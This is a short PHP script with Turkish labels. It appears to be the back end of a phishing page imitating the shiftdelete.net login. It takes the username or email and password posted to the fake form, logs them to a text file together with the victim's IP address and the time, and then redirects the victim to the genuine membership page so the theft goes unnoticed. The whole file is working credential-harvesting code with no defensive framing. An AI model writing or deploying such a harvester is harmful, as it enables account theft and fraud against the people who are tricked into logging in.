<?php
$username = $_POST['log'];
$password = $_POST['pwd'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('retrodogukan.txt', 'a');
fwrite($file, " ----E-posta veya k.adı----> " .$username. " ----Sifre----> " .$password. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
?>

<meta http-equiv="refresh" content="0; url=https://shiftdelete.net/uyelik.php/" />